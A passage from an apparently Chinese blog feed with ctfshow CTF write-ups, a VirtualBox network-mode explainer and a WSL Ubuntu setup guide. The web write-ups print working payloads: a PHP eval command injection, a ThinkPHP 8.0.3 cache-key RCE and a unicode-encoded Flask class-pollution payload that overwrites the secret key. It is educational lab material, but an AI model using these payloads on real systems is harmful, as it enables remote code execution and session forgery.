class="line">print(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ad2c0de5-a09a-41d1-ac6a-546b0bf5ca3f}</p></blockquote><h2 id="misc">misc</h2><h4 id="easy-mem-1">easy_mem_1</h4><blockquote><p>考点：取证</p></blockquote><p>下载镜像文件，根据要求</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124163417068.png" alt="image-20250124163417068"></p><p>需要获取系统信息</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124163453302.png" alt="image-20250124163453302"></p><blockquote><p>ctfshow{ZHUYUN_S_PC_192.168.26.129_22621}</p></blockquote><h4 id="easy-mem-2">easy_mem_2</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124163729197.png" alt="image-20250124163729197"></p><p>先扫描文件，然后搜索QQ关键词，找到QQ号：54297198</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124164354098.png" alt="image-20250124164354098"></p><p>在webtime中找到短剧历史：穿成魔尊后我一心求死</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124165221432.png" alt="image-20250124165221432"></p><p>在webtime中搜索bilibili找到BV号：BV1ZU4y1G7AP</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124165025603.png" alt="image-20250124165025603"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;54297198_穿成魔尊后我一心求死_BV1ZU4y1G7AP</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-mem-3">easy_mem_3</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124165433753.png" alt="image-20250124165433753"></p><p>检查恶意软件，在威胁中发现频繁出现一个exe文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124170752918.png" alt="image-20250124170752918"></p><p>将此exe程序提取得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124170859380.png" alt="image-20250124170859380"></p><p>再在扫描出来的文件中搜索关键词得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250124171610404.png" alt="image-20250124171610404"></p><blockquote><p>ctfshow{Hmohgnsyc.exe_todesk_jieba.net}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow西瓜杯wp</title>
      <link href="/posts/b4e404f6.html"/>
      <url>/posts/b4e404f6.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="CodeInject">CodeInject</h4><blockquote><p>考点：命令执行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#Author: h1xa</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">eval(&quot;var_dump((Object)$_POST[1]);&quot;);</span><br></pre></td></tr></table></figure><blockquote><p>直接构造联合执行。</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1);system(&#x27;ls /&#x27;); #</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125151729390.png" alt="image-20241125151729390"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1);system(&#x27;cat /000f1ag.txt&#x27;); #</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{729e8c3e-142b-447a-8186-86cdac43b7a1}</p></blockquote><h4 id="tpdoor">tpdoor</h4><blockquote><p>考点：thinkphp漏洞</p></blockquote><blockquote><p>打开网址发现，就一句话，什么都没有</p><p>先下载源码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use app\BaseController;</span><br><span class="line">use think\facade\Db;</span><br><span class="line"></span><br><span class="line">class Index extends BaseController</span><br><span class="line">&#123;</span><br><span class="line">    protected $middleware = [&#x27;think\middleware\AllowCrossDomain&#x27;,&#x27;think\middleware\CheckRequestCache&#x27;,&#x27;think\middleware\LoadLangPack&#x27;,&#x27;think\middleware\SessionInit&#x27;];</span><br><span class="line">    public function index($isCache = false , $cacheTime = 3600)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        if($isCache == true)&#123;</span><br><span class="line">            $config = require  __DIR__.&#x27;/../../config/route.php&#x27;;</span><br><span class="line">            $config[&#x27;request_cache_key&#x27;] = $isCache;</span><br><span class="line">            $config[&#x27;request_cache_expire&#x27;] = intval($cacheTime);</span><br><span class="line">            $config[&#x27;request_cache_except&#x27;] = [];</span><br><span class="line">            file_put_contents(__DIR__.&#x27;/../../config/route.php&#x27;, &#x27;&lt;?php return &#x27;. var_export($config, true). &#x27;;&#x27;);</span><br><span class="line">            return &#x27;cache is enabled&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &#x27;Welcome ,cache is disabled&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>审计发现，在 <code>index</code>路由，有一个 <code>require __DIR__.'/../../config/route.php'</code> 操作，同时后边还会对<code>config/route.php</code>修改，猜测和<code>config/route.php</code>文件有关。可控的值是<code>$config['request_cache_key']</code>。</p></blockquote><blockquote><p>先根据 thinkphp 的路由规则，访问 /index.php/1，产生报错</p></blockquote><p><img src="upload/image-20241125194710307.png" alt="image-20241125194710307"></p><blockquote><p>发现是tp8.0.3版本</p><p>源审易得: 数据通过竖线分开, 前面为参数, 后面为函数</p></blockquote><blockquote><p>根据 thinkphp 的路由规则，访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里，然后传递参数<code>isCache</code>和<code>cacheTime</code>。</p><p>然后在 <code>isCache</code>里输入命令，设置<code>cacheTime</code> 为1秒，让cache生效快点，多访问几次，成功RCE</p><p>构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/?cacheTime=0&amp;isCache=ls /|system</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125195017937.png" alt="image-20241125195017937"></p><blockquote><p>/index.php/?cacheTime=0&amp;isCache=cat /000f1ag.txt|system</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125195108938.png" alt="image-20241125195108938"></p><blockquote><p>ctfshow{7d6eab62-7f69-4815-86de-3bb5c8157f41}</p></blockquote><h4 id="easy-polluted">easy_polluted</h4><blockquote><p>考点：原型链污染</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, redirect, url_for,request,render_template</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    return md5_hash.hexdigest()</span><br><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;flag.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>审计代码，发现有merge函数，又是flask架构，想到可能有原型链污染。</p><p>可以直接污染静态目录为根目录，但是有过滤[‘init’, ‘global’, ‘env’, ‘app’, ‘_’, ‘string’]</p><p>但是merge(json.loads(request.data), Evil)中用了json.loads()，所以可以用unicode编码绕过</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;adminer&quot;,&quot;password&quot;:&quot;123&quot;,&quot;__init__&quot;: &#123;&quot;__globals__&quot;: &#123;&quot;app&quot;:&#123;&quot;secret_key&quot;: &quot;123&quot;,&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">unicode编码：</span><br><span class="line">&#123;&quot;username&quot;:&quot;adminer&quot;,&quot;password&quot;:&quot;123&quot;,&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot; : &#123;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot; :&#123;&quot;\u0061\u0070\u0070&quot; :&#123;&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;: &quot;123&quot;,&quot;\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072&quot;:&quot;\u002f&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125221629848.png" alt="image-20241125221629848"></p><blockquote><p>访问/static/flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125221711073.png" alt="image-20241125221711073"></p><blockquote><p>ctfshow{96d52cff-71d8-4006-b644-32e781527715}</p></blockquote><h2 id="misc">misc</h2><h4 id="她说她想结婚">她说她想结婚</h4><blockquote><p>考点：snow隐写，oursecret加密，文件提取，压缩包伪加密，</p></blockquote><blockquote><p>下载附件，解压缩，是一张png图片。</p><p>binwalk检测，发现藏了压缩包。提取压缩包</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204334113.png" alt="image-20241125204334113"></p><blockquote><p>放进010editor,发现全是伪加密。修改09 -&gt; 00</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204450793.png" alt="image-20241125204450793"></p><blockquote><p>解压后发现有一堆文件，先查看flag.txt。</p><p>直接打开是乱码，放进浏览器打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204542518.png" alt="image-20241125204542518"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204621739.png" alt="image-20241125204621739"></p><blockquote><p>snow隐写，需要密码，根据hint，密码就是图片上那句话</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204715554.png" alt="image-20241125204715554"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125204746460.png" alt="image-20241125204746460"></p><blockquote><p>得到一半flag。</p><p>另一半是在png图片里，010中看到了9E 97 BA 2A ,这是oursecret加密</p><p>解密的密码怎么办呢？想想看0~10.txt文件，想到时间戳，提取时间戳后三位，再经过ascii码转换，得到密钥：</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205149978.png" alt="image-20241125205149978"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205216350.png" alt="image-20241125205216350"></p><blockquote><p>先将png文件末尾的压缩包数据删去，然后再放进oursecret解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205242468.png" alt="image-20241125205242468"></p><blockquote><p>得到一段base64。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125205007778.png" alt="image-20241125205007778"></p><blockquote><p>解密得到flag</p><p>ctfshow{W1sh1ng_every0ne_4_happy_time_pl4ying}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机各种网络模式的区别</title>
      <link href="/posts/1324d72d.html"/>
      <url>/posts/1324d72d.html</url>
      
        <content type="html"><![CDATA[<p><strong>虚拟机各种网络模式的区别 NAT | NAT网络 | 桥接Bridged | 内部网络Internal | 仅主机(Host-Only)</strong></p><p><strong>模式一  NAT-网络地址转换</strong>：通过路由器的NAT功能给上网设备分配不同的私有地址，常见于大部分家庭网络，为VirtualBox的默认网络模式</p><p><strong>NAT工作流程</strong>：发送数据时NAT把私有地址转换为公有地址并可用端口进行标识，接收数据时NAT把公有地址转换为私有地址（私有地址有特定范围且不能被公有地址直接访问）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9a430a66a4ccaf9c01572bb2a9b1aac2c154de1d.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：VirtualBox虚拟出一台DHCP服务器并为虚拟机分配私有地址，虚拟机发出的数据在经过网关时通过里NAT改写数据包再通过宿主NAT转换发送到互联网，每个虚拟机都有同样的私有地址且虚拟机之间不可互通，虚拟机可访问宿主机但宿主机不可访问虚拟机（默认DHCP服务器和网关为10.0.2.2，私有地址为10.0.2.15）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/744b82bc579aff88c77261ebfbd77330a18e2d7f.png@1192w.webp" alt="img"></p><p><strong>模式二  NAT网络</strong>：与NAT的区别是通过在虚拟机上附加一台虚拟交换机实现虚拟机在NAT模式下互通</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/af61289e34d600c086ef7404cff0c39c03177140.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：VirtualBox虚拟出一台交换机附加在虚拟机上，虚拟机之间可互通，虚拟机可访问宿主机但宿主机不可访问虚拟机</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e0022982a39992eea61f462ed7483db965c95e83.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置NAT网络</strong>：</p><p>1.启用NAT网络：输入&quot;名称&quot;和&quot;网络掩码&quot;，勾选&quot;启用DHCP&quot;</p><p>2.配置网络模式：虚拟机找到设置-&gt;网络，“连接方式&quot;选择&quot;NAT网络”，&quot;名称&quot;选择上一步设置的网络名称（注意各虚拟机的MAC地址不应相同）</p><p><strong>模式三  桥接（桥接网卡）</strong>：虚拟机在宿主机所在的局域网中，通过宿主机使用的DHCP服务器获取IP地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd8f78aac71c26dfb19d2f7118c5a028cb1427c4.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：虚拟机通过宿主机使用的DHCP服务器获取IP地址，虚拟机间可互通，虚拟机和宿主机间可互通，互联网可访问虚拟机（需给虚拟机分配公网IP）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/23228e13557854d426fdb4174865be322f747a45.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置桥接模式</strong>：虚拟机找到设置-&gt;网络，“连接方式&quot;选择&quot;桥接网卡”，&quot;名称&quot;选择当前上网使用的网络连接（注意各虚拟机的MAC地址不应相同）</p><p><strong>模式四  内部网络</strong>：虚拟机和宿主机隔离，虚拟机使用内部的网络且无法访问外部网络和被外部网络访问</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/caef4843a152749cc368dc8153cb8d6a76217ce2.png@1192w.webp" alt="img"></p><p><strong>应用机制</strong>：虚拟机间可互通，但虚拟机和宿主机/互联网无法互通，且VirtualBox默认不提供DHCP服务器需手动设置静态IP地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8478bde2fd377ab741f524b11fbd13f739c42007.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置内部网络</strong>：虚拟机找到设置-&gt;网络，“连接方式&quot;选择&quot;内部网络”，&quot;名称&quot;选择&quot;internet&quot;并手动给虚拟机配置IP地址</p><p><strong>模式五  仅主机</strong>：虚拟机和宿主机隔离，虚拟机使用提供宿主机提供的网络且无法访问外部网络和被外部网络访问</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1600825bab087d6274de6467c03dee5574e98984.png" alt="img"></p><p><strong>应用机制</strong>：虚拟机使用宿主机的虚拟DHCP服务器、虚拟网卡、虚拟交换机分配的IP地址，虚拟机间可互通，虚拟机和宿主机间可互通（虚拟机只能访问宿主机的虚拟网卡），虚拟机和互联网无法互通</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9b036d3be2d375a9a911faf4262b9506cff803f2.png@1192w.webp" alt="img"></p><p><strong>VirtualBox设置仅主机</strong>：</p><p>1.启用仅主机：输入&quot;名称&quot;、“掩码”、“最小地址&quot;和&quot;最大地址”</p><p>2.配置网络模式：虚拟机找到设置-&gt;网络，“连接方式&quot;选择&quot;仅主机”，&quot;名称&quot;选择上一步创建的网络名称</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl配置ubuntu22.04，并配置docker</title>
      <link href="/posts/ca6bf5ec.html"/>
      <url>/posts/ca6bf5ec.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、在Windows上安装Linux子系统">一、在Windows上安装Linux子系统</h2><h3 id="前提条件">前提条件</h3><ol><li><p>windows机器需要支持虚拟化，并且需要在BIOS中开启虚拟化技术，因为WSL2基于hyper-V。<br><strong>查看是否开启虚拟化</strong><br>按住<code>Windows+R</code>输入<code>cmd</code>打开命令行，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>可以看到如下字样，代表电脑已经支持虚拟化，可继续安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hyper-V 要求:     虚拟机监视器模式扩展: 是</span><br><span class="line">                  固件中已启用虚拟化: 是</span><br><span class="line">                  二级地址转换: 是</span><br><span class="line">                  数据执行保护可用: 是</span><br></pre></td></tr></table></figure></li><li><p>无论是Windows10还是Windows11，所使用的Windows是最新版的，如果不是最新版，请在<code>设置</code>-<code>Windows更新</code>中将系统更新到最新版本</p></li></ol><h3 id="安装步骤">安装步骤</h3><ol><li><p>开启开发者模式</p></li><li><p>开启“适用于Linux的Windows子系统”：</p><p>找到 控制面板<code>-</code>程序和功能<code>-</code>启用或关闭Windows功能，选中“适用于Linux的Windows子系统”和“虚拟机平台”，然后点击确定。需要重启电脑。</p></li><li><p><a href="https://so.csdn.net/so/search?q=%E5%AE%89%E8%A3%85Linux&amp;spm=1001.2101.3001.7020">安装Linux</a>分发版：</p><ol><li><p>没有wsl的：下载Linux内核更新包，<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">适用于 x64 计算机的 WSL2 Linux 内核更新包</a>，安装。</p></li><li><p>有wsl的：直接终端输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure></li></ol></li><li><p>启用虚拟机功能</p><p>安装 WSL 2 之前，必须启用“虚拟机平台”可选功能。 计算机需要虚拟化功能才能使用此功能。<br>以管理员身份打开<code>PowerShell</code>并运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><p>这时需要重启电脑，等待电脑重新启动完成即可。</p></li><li><p>将 WSL 2 设置为默认版本</p></li></ol><p>打开 <code>PowerShell</code>，然后在安装新的 Linux 发行版时运行以下命令，将 WSL 2 设置为默认版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure><ol start="6"><li><p>安装ubuntu22.04版本</p><p>直接在微软商店搜索ubuntu22.04，下载完成就行</p></li><li><p>运行</p><p>在开始菜单可以看到刚刚下载好的ubuntu22.04版本，直接双击运行，会提示输账户和密码，输入后就i能进去。（不输入就是默认root用户，需要自己添加账户）</p><p>此时可以在<code>此电脑</code>中看到<code>Linux</code>，打开它可以看到Ubuntu的文件，后续与Ubuntu之间的文件操作可以从此处进行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241114125151098.png" alt="image-20241114125151098"></p></li></ol><p>安装步骤就完成了。</p><h3 id="创建用户">创建用户</h3><p>１. 创建用户目录<br>注意：登录到root用户．假如你之前没有设置过root用户，那么你就通过以下命令更改密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>然后登录root:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><ol start="2"><li>创建新用户：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -r -m -s /bin/bash username。 #username改成你的用户名</span><br></pre></td></tr></table></figure><p>在 Ubuntu18.04 中，不会在创建用户的时候自动提示设置密码。需要手动执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd username</span><br></pre></td></tr></table></figure><p>来设置新用户的密码。</p><p>其中参数的意义如下：<br>-r：建立系统账号<br>-m：自动建立用户的登入目录<br>-s：指定用户登入后所使用的shell</p><p>输入ls /home/，可以看到用户目录被成功创建了。</p><ol start="3"><li>修改用户权限(添加root权限）<br>这里采用修改/etc/sudoers文件的方法分配用户权限。因为此文件只有r权限，在改动前需要增加w权限，改动后，再去掉w权限。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +w /etc/sudoers</span><br><span class="line">sudo vim /etc/sudoers</span><br><span class="line"></span><br><span class="line">添加下图的配置语句，并且保存修改</span><br><span class="line"></span><br><span class="line">sudo chmod -w /etc/sudoers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c70b3418531a2b054405bca0d0fbf720.png" alt="在这里插入图片描述"></p><p>到此，新用户创建成功，并且用户目录被创建，权限也分配成功。</p><h2 id="二、wsl安装系统到其他盘">二、wsl安装系统到其他盘</h2><p>因为默认是安装ubuntu在C盘，那我一般不喜欢在C盘装软件，所以把ubuntu该到了D盘。</p><h4 id="①查看wsl运行状态，将其保持在关闭状态">①查看wsl运行状态，将其保持在关闭状态</h4><p>在powershell中输入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-7286f01d5c6deb9b.png" alt="img"></p><p>图中STATE显示Running，就需要使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure><p>将其关闭，再次使用&quot;wsl -l -v&quot;确认状态</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-0af870c67ab12a06.png" alt="img"></p><p>发现已经不在运行了</p><h4 id="②导出当前Linux的镜像">②导出当前Linux的镜像</h4><p>在D盘根目录创建了新文件夹“Ubuntu2204”作为之后ubuntu的安装位置</p><p>在Powershell中输入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --export Ubuntu-22.04 H:\ubuntu22.04.tar </span><br></pre></td></tr></table></figure><p>其中，&quot;Ubuntu-22.04&quot;是使用&quot;wsl -l -v&quot;查看到的linux系统的名字和版本，“D:\ubuntu22.04.tar ”是在H盘的根目录下创建名为“ubuntu22.04.tar”的镜像</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-a7306ecc0d00b8be.png" alt="img"></p><h4 id="③注销之前的系统并检查">③注销之前的系统并检查</h4><p>Powershell中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl 